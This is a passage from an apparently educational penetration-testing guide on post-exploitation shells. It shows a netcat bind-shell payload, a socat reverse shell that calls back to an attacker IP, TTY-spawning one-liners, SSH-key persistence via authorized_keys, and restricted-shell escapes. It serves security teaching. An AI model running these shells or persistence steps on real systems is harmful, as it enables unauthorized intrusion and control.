   <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">interact</span>                                   <span class="n">Interacts</span> <span class="k">with</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">on</span> <span class="n">an</span> <span class="n">established</span> <span class="n">socket</span> <span class="n">connection</span>
   <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">reverse</span>                                    <span class="n">Creates</span> <span class="n">an</span> <span class="n">interactive</span> <span class="n">shell</span> <span class="n">through</span> <span class="n">two</span> <span class="n">inbound</span> <span class="n">connections</span>
   <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">reverse_awk</span>                                <span class="n">Creates</span> <span class="n">an</span> <span class="n">interactive</span> <span class="n">shell</span> <span class="n">via</span> <span class="n">GNU</span> <span class="n">AWK</span>
   <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">reverse_python</span>                             <span class="n">Connect</span> <span class="n">back</span> <span class="ow">and</span> <span class="n">create</span> <span class="n">a</span> <span class="n">command</span> <span class="n">shell</span> <span class="n">via</span> <span class="n">Python</span>
   <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">reverse_python_ssl</span>                         <span class="n">Creates</span> <span class="n">an</span> <span class="n">interactive</span> <span class="n">shell</span> <span class="n">via</span> <span class="n">python</span><span class="p">,</span> <span class="n">uses</span> <span class="n">SSL</span><span class="p">,</span> <span class="n">encodes</span> <span class="k">with</span> <span class="n">base64</span> <span class="n">by</span> <span class="n">design</span><span class="o">.</span>
   <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">reverse_r</span>                                  <span class="n">Connect</span> <span class="n">back</span> <span class="ow">and</span> <span class="n">create</span> <span class="n">a</span> <span class="n">command</span> <span class="n">shell</span> <span class="n">via</span> <span class="n">R</span>
   <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">reverse_ruby</span>                               <span class="n">Connect</span> <span class="n">back</span> <span class="ow">and</span> <span class="n">create</span> <span class="n">a</span> <span class="n">command</span> <span class="n">shell</span> <span class="n">via</span> <span class="n">Ruby</span>
<span class="o">**</span><span class="n">snip</span><span class="o">**</span>
</pre></div>
</div>
<p>Now, try to check the payload</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">bind_netcat</span>
<span class="n">Payload</span> <span class="n">size</span><span class="p">:</span> <span class="mi">105</span> <span class="nb">bytes</span>
<span class="n">mkfifo</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">cdniov</span><span class="p">;</span> <span class="p">(</span><span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="o">-</span><span class="n">p</span> <span class="mi">4444</span> <span class="o">||</span><span class="n">nc</span> <span class="o">-</span><span class="n">l</span> <span class="mi">4444</span><span class="p">)</span><span class="mi">0</span><span class="o">&lt;/</span><span class="n">tmp</span><span class="o">/</span><span class="n">cdniov</span> <span class="o">|</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">&gt;/</span><span class="n">tmp</span><span class="o">/</span><span class="n">cdniov</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="p">;</span> <span class="n">rm</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">cdniov</span>
</pre></div>
</div>
</section>
</section>
<section id="spawning-a-tty-shell">
<span id="id13"></span><h3>Spawning a TTY Shell<a class="headerlink" href="#spawning-a-tty-shell" title="Link to this heading"></a></h3>
<p>Once we have reverse shell, we need a full TTY session by using either Python, sh, perl, ruby, lua, IRB. <a class="reference external" href="https://netsec.ws/?p=337">Spawning a TTY Shell</a> and <a class="reference external" href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Post-Exploitation Without A TTY</a> have provided multiple ways to get a tty shell</p>
<section id="id15">
<h4>Python<a class="headerlink" href="#id15" title="Link to this heading"></a></h4>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import os; os.system(&quot;/bin/bash&quot;)&#39;</span>
</pre></div>
</div>
</section>
<section id="sh">
<h4>sh<a class="headerlink" href="#sh" title="Link to this heading"></a></h4>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>/bin/sh<span class="w"> </span>-i
</pre></div>
</div>
</section>
<section id="id16">
<h4>Perl<a class="headerlink" href="#id16" title="Link to this heading"></a></h4>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>perl:<span class="w"> </span><span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">;</span>
</pre></div>
</div>
</section>
<section id="id17">
<h4>Ruby<a class="headerlink" href="#id17" title="Link to this heading"></a></h4>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ruby:<span class="w"> </span><span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span>
</pre></div>
</div>
</section>
<section id="lua">
<h4>Lua<a class="headerlink" href="#lua" title="Link to this heading"></a></h4>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>lua:<span class="w"> </span>os.execute<span class="o">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="o">)</span>
</pre></div>
</div>
</section>
<section id="irb">
<h4>IRB<a class="headerlink" href="#irb" title="Link to this heading"></a></h4>
<p>(From within IRB)</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">exec</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span>
</pre></div>
</div>
</section>
<section id="vi">
<h4>VI<a class="headerlink" href="#vi" title="Link to this heading"></a></h4>
<p>(From within vi)</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>:!bash
</pre></div>
</div>
<p>(From within vi)</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>:set<span class="w"> </span><span class="nv">shell</span><span class="o">=</span>/bin/bash:shell
</pre></div>
</div>
<p>Also, if we execute</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">vi</span> <span class="p">;</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
</pre></div>
</div>
<p>Once, we exit vi, we would get shell. Helpful in scenarios where the user is asked to input which file to open.</p>
</section>
<section id="id18">
<h4>Nmap<a class="headerlink" href="#id18" title="Link to this heading"></a></h4>
<p>(From within nmap)</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>!sh
</pre></div>
</div>
</section>
<section id="expect">
<h4>Expect<a class="headerlink" href="#expect" title="Link to this heading"></a></h4>
<p>Using “Expect” To Get A TTY</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>$<span class="w"> </span>cat<span class="w"> </span>sh.exp
<span class="c1">#!/usr/bin/expect</span>
<span class="c1"># Spawn a shell, then allow the user to interact with it.</span>
<span class="c1"># The new shell will have a good enough TTY to run tools like ssh, su and login</span>
spawn<span class="w"> </span>sh
interact
</pre></div>
</div>
</section>
<section id="sneaky-stealthy-su-in-web-shells">
<h4>Sneaky Stealthy SU in (Web) Shells<a class="headerlink" href="#sneaky-stealthy-su-in-web-shells" title="Link to this heading"></a></h4>
<p>Let’s say we have a webshell on the server (probably, we would be logged in as a apache user), however, if we have credentials of another user, and we want to login we need a tty shell. We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell.</p>
<p><strong>Example</strong></p>
<p>Webshell like</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://IP/shell.php?cmd=id
</pre></div>
</div>
<p>If we try</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="n">password</span> <span class="o">|</span> <span class="n">su</span> <span class="o">-</span><span class="n">c</span> <span class="n">whoami</span>
</pre></div>
</div>
<p>Probably will get</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">standard</span> <span class="ow">in</span> <span class="n">must</span> <span class="n">be</span> <span class="n">a</span> <span class="n">tty</span>
</pre></div>
</div>
<p>The su command would work from a terminal, however, would not take in raw stuff via the shell’s Standard Input. We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">sleep</span> <span class="mi">1</span><span class="p">;</span> <span class="n">echo</span> <span class="n">password</span><span class="p">)</span> <span class="o">|</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;whoami&#39;]);&quot;</span>
<span class="n">root</span>
</pre></div>
</div>
<p>The above has been referenced from SANS <a class="reference external" href="https://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells#">Sneaky Stealthy SU in (Web) Shells</a></p>
</section>
</section>
<section id="spawning-a-fully-interactive-ttys-shell">
<h3>Spawning a Fully Interactive TTYs Shell<a class="headerlink" href="#spawning-a-fully-interactive-ttys-shell" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://twitter.com/ropnop">Ronnie Flathers</a> has already written a great blog on <a class="reference external" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">Upgrading simple shells to fully interactive TTYs</a> Hence, almost everything is taken from that blog post and kept here for completion.</p>
<p>Many times, we will not get a fully interactive shell therefore it will/ have:</p>
<ul class="simple">
<li><p>Difficult to use the text editors like vim</p></li>
<li><p>No tab-complete</p></li>
<li><p>No up arrow history</p></li>
<li><p>No job control</p></li>
</ul>
<section id="socat">
<h4>Socat<a class="headerlink" href="#socat" title="Link to this heading"></a></h4>
<p>Socat can be used to pass full TTY’s over TCP connections.</p>
<p>On Kali-Machine (Attackers - Probably yours)</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>socat file:`tty`,raw,echo=0 tcp-listen:4444
</pre></div>
</div>
<p>On Victim (launch):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">socat</span> <span class="n">exec</span><span class="p">:</span><span class="s1">&#39;bash -li&#39;</span><span class="p">,</span><span class="n">pty</span><span class="p">,</span><span class="n">stderr</span><span class="p">,</span><span class="n">setsid</span><span class="p">,</span><span class="n">sigint</span><span class="p">,</span><span class="n">sane</span> <span class="n">tcp</span><span class="p">:</span><span class="mf">10.0.3.4</span><span class="p">:</span><span class="mi">4444</span>
</pre></div>
</div>
<p>If socat isn’t installed, download standalone binaries that can be downloaded from <a class="reference external" href="https://github.com/andrew-d/static-binaries">static binaries</a></p>
<p>Download the correct binary architecture of socat to a writable directory, chmod it, execute</p>
</section>
<section id="stty">
<h4>stty<a class="headerlink" href="#stty" title="Link to this heading"></a></h4>
<p>Use the methods mentioned in <a class="reference internal" href="#spawning-a-tty-shell"><span class="std std-ref">Spawning a TTY Shell</span></a></p>
<p>Once bash is running in the PTY, background the shell with Ctrl-Z
While the shell is in the background, examine the current terminal and STTY info so we can force the connected shell to match it</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>echo $TERM
xterm-256color
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>stty -a
speed 38400 baud; rows 59; columns 264; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = &lt;undef&gt;; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V;   discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
</pre></div>
</div>
<p>The information needed is the TERM type (“xterm-256color”) and the size of the current TTY (“rows 38; columns 116”)</p>
<p>With the shell still backgrounded, set the current STTY to type raw and tell it to echo the input characters with the following command:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span>
</pre></div>
</div>
<p>With a raw stty, input/ output will look weird and you won’t see the next commands, but as you type they are being processed.</p>
<p>Next foreground the shell with fg. It will re-open the reverse shell but formatting will be off. Finally, reinitialize the terminal with reset.</p>
<p>After the reset the shell should look normal again. The last step is to set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ export SHELL=bash
$ export TERM=xterm256-color
$ stty rows 38 columns 116
</pre></div>
</div>
<p>The end result is a fully interactive TTY with all the features we’d expect (tab-complete, history, job control, etc) all over a netcat connection</p>
</section>
<section id="ssh-key">
<h4>ssh-key<a class="headerlink" href="#ssh-key" title="Link to this heading"></a></h4>
<p>If we have some user shell or access, probably it would be a good idea to generate a new ssh private-public key pair using ssh-keygen</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh</span><span class="o">-</span><span class="n">keygen</span>
<span class="n">Generating</span> <span class="n">public</span><span class="o">/</span><span class="n">private</span> <span class="n">rsa</span> <span class="n">key</span> <span class="n">pair</span><span class="o">.</span>
<span class="n">Enter</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">which</span> <span class="n">to</span> <span class="n">save</span> <span class="n">the</span> <span class="n">key</span> <span class="p">(</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bitvijays</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="p">):</span>
<span class="n">Enter</span> <span class="n">passphrase</span> <span class="p">(</span><span class="n">empty</span> <span class="k">for</span> <span class="n">no</span> <span class="n">passphrase</span><span class="p">):</span>
<span class="n">Enter</span> <span class="n">same</span> <span class="n">passphrase</span> <span class="n">again</span><span class="p">:</span>
<span class="n">Your</span> <span class="n">identification</span> <span class="n">has</span> <span class="n">been</span> <span class="n">saved</span> <span class="ow">in</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bitvijays</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="o">.</span>
<span class="n">Your</span> <span class="n">public</span> <span class="n">key</span> <span class="n">has</span> <span class="n">been</span> <span class="n">saved</span> <span class="ow">in</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bitvijays</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="o">.</span><span class="n">pub</span><span class="o">.</span>
<span class="n">The</span> <span class="n">key</span> <span class="n">fingerprint</span> <span class="ow">is</span><span class="p">:</span>
<span class="n">SHA256</span><span class="p">:</span><span class="n">JbdAhAIPl8qm</span><span class="o">/</span><span class="n">kCANJcpggeVoZqWnFRvVbxu2u9zc5U</span> <span class="n">bitvijays</span><span class="nd">@Kali</span><span class="o">-</span><span class="n">Home</span>
<span class="n">The</span> <span class="n">key</span><span class="s1">&#39;s randomart image is:</span>
<span class="o">+---</span><span class="p">[</span><span class="n">RSA</span> <span class="mi">2048</span><span class="p">]</span><span class="o">----+</span>
<span class="o">|</span><span class="n">o</span><span class="o">==*+.</span> <span class="o">+=.</span>       <span class="o">|</span>
<span class="o">|=</span><span class="n">o</span><span class="o">**+</span> <span class="n">o</span><span class="o">.</span> <span class="o">.</span>       <span class="o">|</span>
<span class="o">|=+...+</span>  <span class="n">o</span> <span class="o">+</span>      <span class="o">|</span>
<span class="o">|=.*</span> <span class="o">.</span>    <span class="o">*</span> <span class="o">.</span>     <span class="o">|</span>
<span class="o">|</span><span class="n">oO</span>      <span class="n">S</span> <span class="o">.</span>     <span class="o">.|</span>
<span class="o">|+</span>        <span class="n">o</span>     <span class="n">E</span><span class="o">.|</span>
<span class="o">|..</span>      <span class="o">+</span>       <span class="o">.|</span>
<span class="o">|</span> <span class="o">..</span>    <span class="o">.</span> <span class="o">.</span> <span class="o">.</span> <span class="n">o</span> <span class="o">.</span> <span class="o">|</span>
<span class="o">|</span>  <span class="o">..</span>      <span class="n">ooo</span> <span class="n">o</span>  <span class="o">|</span>
<span class="o">+----</span><span class="p">[</span><span class="n">SHA256</span><span class="p">]</span><span class="o">-----+</span>
</pre></div>
</div>
<p>Copy/ Append the public part to /home/user/.ssh/authorized_keys</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bitvijays</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="o">.</span><span class="n">pub</span>

<span class="n">echo</span> <span class="s2">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+tbCpnhU5qQm6typWI52FCin6NDYP0hmQFfag2kDwMDIS0j1ke/kuxfqfQKlbva9eo6IUaCrjIuAqbsZTsVjyFfjzo/hDKycR1M5/115Jx4q4v48a7BNnuUqi +qzUFjldFzfuTp6XM1n+Y1B6tQJJc9WruOFUNK2EX6pmOIkJ8QPTvMXYaxwol84MRb89V9vHCbfDrbWFhoA6hzeQVtI01ThMpQQqGv5LS+rI0GVlZnT8cUye0uiGZW7ek9DdcTEDtMUv1Y99zivk4FJmQWLzxplP5dUJ1NH5rm6YBH8CoQHLextWc36Ih18xsyzW8qK4Bfl4sOtESHT5/3PlkQHN bitvijays@Kali-Home&quot;</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">user</span><span class="o">/.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>
</pre></div>
</div>
<p>Now, ssh to the box using that user.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="n">user</span><span class="nd">@hostname</span> <span class="o">-</span><span class="n">i</span> <span class="n">id_rsa</span>
</pre></div>
</div>
</section>
</section>
<section id="restricted-shell">
<h3>Restricted Shell<a class="headerlink" href="#restricted-shell" title="Link to this heading"></a></h3>
<p>Sometimes, after getting a shell, we figure out that we are in restricted shell. The below has been taken from <a class="reference external" href="https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells">Escaping Restricted Linux Shells</a>, <a class="reference external" href="https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells">Escape from SHELLcatraz</a></p>
<section id="definition">
<h4>Definition<a class="headerlink" href="#definition" title="Link to this heading"></a></h4>
<p>It limits a user’s ability and only allows them to perform a subset of system commands. Typically, a combination of some or all of the following restrictions are imposed by a restricted shell:</p>
<ul class="simple">
<li><p>Using the ‘cd’ command to change directories.</p></li>
<li><p>Setting or un-setting certain environment variables (i.e. SHELL, PATH, etc…).</p></li>
<li><p>Specifying command names that contain slashes.</p></li>
<li><p>Specifying a filename containing a slash as an argument to the ‘.’ built-in command.</p></li>
<li><p>Specifying a filename containing a slash as an argument to the ‘-p’ option to the ‘hash’ built-in command.</p></li>
<li><p>Importing function definitions from the shell environment at startup.</p></li>
<li><p>Parsing the value of SHELLOPTS from the shell environment at startup.</p></li>
<li><p>Redirecting output using the ‘&gt;’, ‘&gt;|’, “, ‘&gt;&amp;’, ‘&amp;&gt;’, and ‘&gt;&gt;’ redirection operators.</p></li>
<li><p>Using the ‘exec’ built-in to replace the shell with another command.</p></li>
<li><p>Adding or deleting built-in commands with the ‘-f’ and ‘-d’ options to the enable built-in.</p></li>
<li><p>Using the ‘enable’ built-in command to enable disabled shell built-ins.</p></li>
<li><p>Specifying the ‘-p’ option to the ‘command’ built-in.</p></li>
<li><p>Turning off restricted mode with ‘set +r’ or ‘set +o restricted</p></li>
</ul>
<p>Real shell implements restricted shells:</p>
<ul>
<li><p>rbash</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">bash</span> <span class="o">-</span><span class="n">r</span>
<span class="n">cd</span>
<span class="n">bash</span><span class="p">:</span> <span class="n">cd</span><span class="p">:</span> <span class="n">restricted</span>
</pre></div>
</div>
</li>
<li><p>rsh</p></li>
<li><p>rksh</p></li>
</ul>
<p><strong>Getting out of restricted shell</strong></p>
</section>
<section id="reconnaissance">
<h4>Reconnaissance<a class="headerlink" href="#reconnaissance" title="Link to this heading"></a></h4>
<p>Find out information about the environment.</p>
<ul class="simple">
<li><p>Run env to see exported environment variables</p></li>
<li><p>Run ‘export -p’ to see the exported variables in the shell. This would tell which variables are read-only. Most likely the PATH ($PATH) and SHELL ($SHELL) variables are ‘-rx’, which means we can execute them, but not write to them. If they are writeable, we would be able to escape the restricted shell!</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>If the SHELL variable is writeable, you can simply set it to your shell of choice (i.e. sh, bash, ksh, etc…).</p></li>
<li><p>If the PATH is writeable, then you’ll be able to set it to any directory you want. We recommend setting it to one that has commands vulnerable to shell escapes.</p></li>
</ul>
</div></blockquote>
<ul class="simple">
<li><p>Try basic Unix commands and see what’s allowed ls, pwd, cd, env, set, export, vi, cp, mv etc.</p></li>
</ul>
</section>
<section id="quick-wins">
<h4>Quick Wins<a class="headerlink" href="#quick-wins" title="Link to this heading"></a></h4>
<ul>
<li><p>If ‘/’ is allowed in commands just run /bin/sh</p></li>
<li><p>If we can set PATH or SHELL variable</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>export PATH=/bin:/usr/bin:/sbin:$PATH
export SHELL=/bin/sh
</pre></div>
</div>
<p>or if chsh command is present just change the shell to /bin/bash</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">chsh</span>
<span class="n">password</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">password</span> <span class="n">will</span> <span class="n">be</span> <span class="n">asked</span><span class="o">&gt;</span>
<span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
</pre></div>
</div>
</li>
<li><p>If we can copy files into existing PATH, copy</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cp</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">/</span><span class="n">current</span><span class="o">/</span><span class="n">directory</span><span class="p">;</span> <span class="n">sh</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="taking-help-of-binaries">
<h4>Taking help of binaries<a class="headerlink" href="#taking-help-of-binaries" title="Link to this heading"></a></h4>
<p>Some commands let us execute other system commands, often bypassing shell restrictions</p>
<ul class="simple">
<li><p>ftp -&gt; !/bin/sh</p></li>
<li><p>gdb -&gt; !/bin/sh</p></li>
<li><p>more/ less/ man -&gt; !/bin/sh</p></li>
<li><p>vi -&gt; :!/bin/sh : Refer <a class="reference external" href="http://airnesstheman.blogspot.in/2011/05/breaking-out-of-jail-restricted-shell.html">Breaking out of Jail : Restricted Shell</a> and <a class="reference external" href="http://linuxshellaccount.blogspot.in/2008/05/restricted-accounts-and-vim-tricks-in.html">Restricted Accounts and Vim Tricks in Linux and Unix</a></p></li>
<li><p>scp -S /tmp/getMeOut.sh x y : Refer <a class="reference external" href="http://pentestmonkey.net/blog/rbash-scp">Breaking out of rbash using scp</a></p></li>
<li><p>awk ‘BEGIN {system(“/bin/sh”)}’</p></li>
<li><p>find / -name someName -exec /bin/sh ;</p></li>
<li><p>tee</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;Your evil code&quot;</span> <span class="o">|</span> <span class="n">tee</span> <span class="n">script</span><span class="o">.</span><span class="n">sh</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Invoke shell thru scripting language</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>Python</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import os; os.system(&quot;/bin/bash&quot;)</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Perl</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
</pre></div>
</div>
</div></blockquote>
</div></blockquote>
</section>
<section id="sshing-from-outside">
<h4>SSHing from outside<a class="headerlink" href="#sshing-from-outside" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>Use SSH on your machine to execute commands before the remote shell is loaded:</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="n">username</span><span class="nd">@IP</span> <span class="o">-</span><span class="n">t</span> <span class="s2">&quot;/bin/sh&quot;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Start the remote shell without loading “rc” profile (where most of the limitations are often configured)</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="n">username</span><span class="nd">@IP</span> <span class="o">-</span><span class="n">t</span> <span class="s2">&quot;bash --noprofile&quot;</span>

<span class="o">-</span><span class="n">t</span>      <span class="n">Force</span> <span class="n">pseudo</span><span class="o">-</span><span class="n">terminal</span> <span class="n">allocation</span><span class="o">.</span>  <span class="n">This</span> <span class="n">can</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">arbitrary</span> <span class="n">screen</span><span class="o">-</span><span class="n">based</span> <span class="n">programs</span> <span class="n">on</span> <span class="n">a</span> <span class="n">remote</span> <span class="n">machine</span><span class="p">,</span> <span class="n">which</span> <span class="n">can</span> <span class="n">be</span> <span class="n">very</span> <span class="n">useful</span><span class="p">,</span> <span class="n">e</span><span class="o">.</span><span class="n">g</span><span class="o">.</span> <span class="n">when</span> <span class="n">implementing</span> <span class="n">menu</span> <span class="n">services</span><span class="o">.</span>  <span class="n">Multiple</span> <span class="o">-</span><span class="n">t</span> <span class="n">options</span> <span class="n">force</span> <span class="n">tty</span> <span class="n">allocation</span><span class="p">,</span> <span class="n">even</span> <span class="k">if</span> <span class="n">ssh</span> <span class="n">has</span> <span class="n">no</span> <span class="n">local</span> <span class="n">tty</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="getting-out-of-rvim">
<h4>Getting out of rvim<a class="headerlink" href="#getting-out-of-rvim" title="Link to this heading"></a></h4>
<p>Main difference of rvim vs vim is that rvim does not allow escape to shell with previously described techniques and, on top of that, no shell commands at all. Taken from <a class="reference external" href="https://ctftime.org/writeup/5784">vimjail</a></p>
<ul class="simple">
<li><p>To list all installed features it is possible to use ‘:version’ vim command.</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">:</span><span class="n">version</span>
<span class="n">VIM</span> <span class="o">-</span> <span class="n">Vi</span> <span class="n">IMproved</span> <span class="mf">8.0</span> <span class="p">(</span><span class="mi">2016</span> <span class="n">Sep</span> <span class="mi">12</span><span class="p">,</span> <span class="n">compiled</span> <span class="n">Nov</span> <span class="mi">04</span> <span class="mi">2017</span> <span class="mi">04</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">46</span><span class="p">)</span>
<span class="n">Included</span> <span class="n">patches</span><span class="p">:</span> <span class="mi">1</span><span class="o">-</span><span class="mi">1257</span>
<span class="n">Modified</span> <span class="n">by</span> <span class="n">pkg</span><span class="o">-</span><span class="n">vim</span><span class="o">-</span><span class="n">maintainers</span><span class="nd">@lists</span><span class="o">.</span><span class="n">alioth</span><span class="o">.</span><span class="n">debian</span><span class="o">.</span><span class="n">org</span>
<span class="n">Compiled</span> <span class="n">by</span> <span class="n">pkg</span><span class="o">-</span><span class="n">vim</span><span class="o">-</span><span class="n">maintainers</span><span class="nd">@lists</span><span class="o">.</span><span class="n">alioth</span><span class="o">.</span><span class="n">debian</span><span class="o">.</span><span class="n">org</span>
<span class="n">Huge</span> <span class="n">version</span> <span class="k">with</span> <span class="n">GTK2</span> <span class="n">GUI</span><span class="o">.</span>  <span class="n">Features</span> <span class="n">included</span> <span class="p">(</span><span class="o">+</span><span class="p">)</span> <span class="ow">or</span> <span class="ow">not</span> <span class="p">(</span><span class="o">-</span><span class="p">):</span>
